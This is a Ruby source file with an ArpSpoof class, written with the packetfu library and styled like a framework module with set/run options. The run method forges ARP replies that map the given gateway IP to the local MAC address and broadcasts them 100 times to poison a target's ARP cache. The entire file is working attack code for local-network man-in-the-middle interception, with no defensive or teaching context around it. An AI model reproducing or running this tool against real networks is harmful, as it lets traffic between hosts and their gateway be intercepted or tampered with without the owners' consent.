require 'packetfu'

class ArpSpoof
  attr_accessor :target_ip, :gateway_ip, :interface

  def initialize
    @target_ip  = nil
    @gateway_ip = nil
    @interface  = "eth0"
  end

  def set(option, value)
    case option.downcase
    when "target_ip"
      @target_ip = value
    when "gateway_ip"
      @gateway_ip = value
    when "interface"
      @interface = value
    end
  end

  def detect_os
    RUBY_PLATFORM =~ /linux/
  end

  def run
    return unless detect_os && @target_ip && @gateway_ip

    config = PacketFu::Utils.whoami?(:iface => @interface)
    local_mac = config[:eth_saddr]

    arp_packet = PacketFu::ARPPacket.new
    arp_packet.eth_saddr     = local_mac
    arp_packet.eth_daddr     = "ff:ff:ff:ff:ff:ff"
    arp_packet.arp_saddr_mac = local_mac
    arp_packet.arp_daddr_mac = "00:00:00:00:00:00"
    arp_packet.arp_saddr_ip  = @gateway_ip
    arp_packet.arp_daddr_ip  = @target_ip
    arp_packet.arp_opcode    = 2

    100.times { arp_packet.to_w(@interface) }
  rescue => e
    puts e.message
  end
end